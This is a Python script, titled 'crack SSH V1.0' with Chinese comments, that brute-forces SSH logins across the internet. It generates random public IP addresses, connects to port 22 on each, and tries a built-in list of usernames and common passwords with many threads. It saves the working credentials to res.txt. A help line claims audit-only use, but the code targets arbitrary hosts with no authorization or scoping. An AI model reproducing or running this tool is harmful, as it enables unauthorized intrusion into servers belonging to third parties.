#!/usr/bin/python
# -*- coding: UTF-8 -*-
import paramiko
import telnetlib
from termcolor import *
import random
import threading
import queue
import base64
import requests
help="""
crack SSH V1.0版本。

ssh大规模爆破工具，此程序运行后，随机获取全网IP地址段进行ssh服务的爆破，
程序自带用户名与密码字典，只要程序还在运行，
爆破工作就一直会在。爆破成功后，成功的记录会保存在当前目录中的res.txt中。
此程序仅用于安全审计用途，不作为入侵工具。

"""
print(help)
users=['root','ubuntu']#用户名字典  下面是密码字典
passwords=['Passw0rd','admin123!@#','admin123','admin@123','admin#123','root','123456','password','12345','1234','root','123','qwerty','test','1q2w3e4r','1qaz2wsx','qazwsx','123qwe','123qaz','0000','oracle','1234567','123456qwerty','password123','12345678','1q2w3e','abc123','okmnji','test123','123456789','postgres','q1w2e3r4','a123456','a123456789','111111','123123','woaini1314','zxcvbnm','qq123456','abc123456','123456a','123456789a','000000','iloveyou']
outfile='res.txt'#成功后保存的结果

threadmax=int(input('爆破线程运行个数(建议在 30~300 之间)：'))
timeout=int(input('连接超时：'))
print('初始化中~~~~~~~~~~~~~~~~')



def test_ssh(q):
    while not q.empty():
        ip=q.get()
        q.put(randip())#每调用一次都产生随机IP，保存队列永远存在IP地址。
        global outfile,timeout
        try:
            #telnetlib.Telnet(ip, 111, timeout=2)#判断额外端口的
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # 跳过了远程连接中选择‘是’的环节,
            ssh.connect(ip, 22, '', '',timeout=timeout)
            ssh.close()
        except Exception as e:
            if 'Authentication' in str(e):#捕获所有的异常，根据返回信息，判断是否是ssh的，决定是否往下爆破。
                print(ip+'    to crack')
                for us in users:
                    for pa in passwords:
                        try:
                            ssh.connect(ip, 22, us, pa, timeout=timeout)
                            print(colored(ip+' '+us+' '+pa+' '+'连接成功~~~~~~~','red'))
                            open(outfile,'a',encoding='utf-8').write(ip+' '+us+' '+pa+'\n')#成功了，就写入文本
                            data_text=ip+' '+us+' '+pa
                            ssh.close()
                            break
                        except Exception as e:
                            print(ip+' '+us+' '+pa+' '+str(e))
                            ssh.close()
            else:
                print(ip,str(e))
        q.task_done()
q=queue.Queue()
def randip():#产生随机IP地址
    rand=[]
    for i in range(4):
        rand.append(random.randint(0, 256))
    # exclude 127.x.x.x
    while True:
        if rand[0] == 127 or rand[0]==192 or rand[0]==10 or rand[0]==172:#去除内网网段
            rand[0]=random.randrange(0, 256)
        else:
            break
    ipadd = '%d.%d.%d.%d' % (rand[0], rand[1], rand[2], rand[3])
    rand.clear()
    return (ipadd)


for i in range(99999):#住队列加入随机IP，不需要改
    q.put(randip())

for j in range(threadmax):
    threading.Thread(target=test_ssh,args=(q,)).start()#启动线程。


